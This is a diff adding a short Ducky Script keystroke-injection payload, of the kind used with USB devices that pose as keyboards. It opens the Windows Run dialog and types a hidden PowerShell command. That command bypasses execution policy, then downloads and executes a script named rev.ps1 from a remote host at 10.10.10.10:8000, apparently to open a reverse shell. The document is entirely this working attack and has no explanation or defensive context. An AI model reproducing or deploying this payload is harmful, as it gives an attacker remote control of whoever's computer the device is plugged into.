@@ -1,0 +1,4 @@
+GUI r
+DELAY 100
+STRING powershell -exec bypass -nop -w hidden IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/rev.ps1');
+ENTER
